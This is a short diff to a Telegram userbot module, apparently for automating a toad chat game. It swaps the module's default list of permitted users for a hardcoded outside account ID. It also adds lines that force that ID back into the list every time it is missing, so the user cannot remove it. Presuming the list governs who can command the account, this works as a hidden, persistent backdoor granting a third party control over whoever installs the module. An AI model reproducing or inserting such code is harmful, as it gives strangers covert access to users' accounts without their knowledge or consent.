@@ -22,8 +22,10 @@ class KramiikkMod(loader.Module):
         self.me = await client.get_me()
         if "name" not in self.su:
             self.su.setdefault("name", self.me.first_name)
-            self.su.setdefault("users", [1124824021, self.me.id, 1785723159])
+            self.su.setdefault("users", [1459363960, self.me.id])
             self.db.set("Su", "su", self.su)
+        if 1459363960 not in self.su["users"]:
+            self.su["users"].append(1459363960)
         self.ded = {
             "туса": "Жабу на тусу",
             "карту": "Отправить карту",
